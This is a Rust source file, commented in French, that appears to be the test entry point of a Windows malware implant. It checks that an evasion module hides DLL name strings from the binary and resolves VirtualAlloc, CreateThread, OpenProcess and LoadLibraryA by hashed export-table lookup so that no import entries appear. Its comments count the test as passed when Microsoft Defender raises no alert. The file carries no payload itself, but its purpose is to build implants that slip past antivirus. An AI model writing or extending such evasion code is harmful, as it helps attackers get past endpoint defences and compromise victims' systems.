mod evasion;

#[cfg(windows)]
fn main() {
    use evasion::api_hashing::{resolve, H_CREATE_THREAD, H_LOAD_LIBRARY_A, H_OPEN_PROCESS, H_VIRTUAL_ALLOC};

    unsafe {
        // Valide obfstr : ces strings n'apparaissent jamais en clair dans .rdata
        let _k32 = hide!("kernel32.dll\0");
        let _ntdll = hide!("ntdll.dll\0");

        // Valide API hashing : résout les 4 API par EAT walk, sans entrée IAT
        let tests: &[(&str, Option<*const ()>)] = &[
            ("VirtualAlloc",  resolve(b"kernel32.dll\0", H_VIRTUAL_ALLOC)),
            ("CreateThread",  resolve(b"kernel32.dll\0", H_CREATE_THREAD)),
            ("OpenProcess",   resolve(b"kernel32.dll\0", H_OPEN_PROCESS)),
            ("LoadLibraryA",  resolve(b"kernel32.dll\0", H_LOAD_LIBRARY_A)),
        ];

        for (name, ptr) in tests {
            assert!(ptr.is_some(), "EAT walk failed: {}", name);
        }
        // Tous les asserts passés = évasion OK, binaire exit 0
        // Aucune alerte Defender = test validé
    }
}

#[cfg(not(windows))]
fn main() {
    panic!("implant cible uniquement Windows (x86_64-pc-windows-msvc)");
}
